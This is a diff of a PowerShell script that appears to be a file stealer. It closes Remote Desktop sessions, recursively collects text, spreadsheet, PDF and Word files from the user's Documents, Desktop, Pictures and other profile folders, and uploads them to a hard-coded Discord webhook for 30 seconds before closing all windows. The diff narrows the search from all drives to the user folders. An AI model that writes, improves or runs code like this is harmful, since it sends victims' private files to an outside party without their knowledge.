@@ -53,16 +53,28 @@ function Upload-FileToDiscord {
     }
 }
 
-# Function to get files by extension in rotation
-function Get-FilesInRotation {
+# Function to get files by extension in rotation from user directories
+function Get-FilesInUserDirectories {
     param (
-        [string]$rootPath,
         [array]$extensions
     )
 
+    $userFolders = @(
+        [System.Environment]::GetFolderPath("MyDocuments"),
+        [System.Environment]::GetFolderPath("Desktop"),
+        [System.Environment]::GetFolderPath("Favorites"),
+        [System.Environment]::GetFolderPath("Personal"),
+        [System.Environment]::GetFolderPath("Profile"),
+        [System.Environment]::GetFolderPath("MyMusic"),
+        [System.Environment]::GetFolderPath("MyPictures"),
+        [System.Environment]::GetFolderPath("MyVideos")
+    )
+
     $files = @()
-    foreach ($extension in $extensions) {
-        $files += Get-ChildItem -Path $rootPath -Filter "*.$extension" -Recurse -File -ErrorAction SilentlyContinue
+    foreach ($folder in $userFolders) {
+        foreach ($extension in $extensions) {
+            $files += Get-ChildItem -Path $folder -Filter "*.$extension" -Recurse -File -ErrorAction SilentlyContinue
+        }
     }
     return $files
 }
@@ -78,23 +90,18 @@ function Close-AllWindows {
 # Close any active Remote Desktop connections
 Close-RemoteDesktopConnections
 
-# Recursively get all .txt, .xlsx, .pdf, .doc, .docx files from all drives in rotation
+# Recursively get all .txt, .xlsx, .pdf, .doc, .docx files from user folders
 $webhookUrl = "https://discord.com/api/webhooks/1243581518152990801/HeVZuyvWfQSYBl1ipXcbIEb2uIScSwlrXj6lazDoujaA741SdO4idCw8nhchRScTwinE"
 $extensions = @("txt", "xlsx", "pdf", "doc", "docx")
-$drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Free -gt 0 }
-
 $startTime = Get-Date
-foreach ($drive in $drives) {
-    foreach ($extension in $extensions) {
-        $files = Get-FilesInRotation -rootPath $drive.Root -extensions @($extension)
-        foreach ($file in $files) {
-            $currentTime = Get-Date
-            if (($currentTime - $startTime).TotalSeconds -gt 30) {
-                break
-            }
-            Upload-FileToDiscord -filePath $file.FullName -webhookUrl $webhookUrl
-        }
+
+$files = Get-FilesInUserDirectories -extensions $extensions
+foreach ($file in $files) {
+    $currentTime = Get-Date
+    if (($currentTime - $startTime).TotalSeconds -gt 30) {
+        break
     }
+    Upload-FileToDiscord -filePath $file.FullName -webhookUrl $webhookUrl
 }
 
 # Close all windows and stop the script after 30 seconds
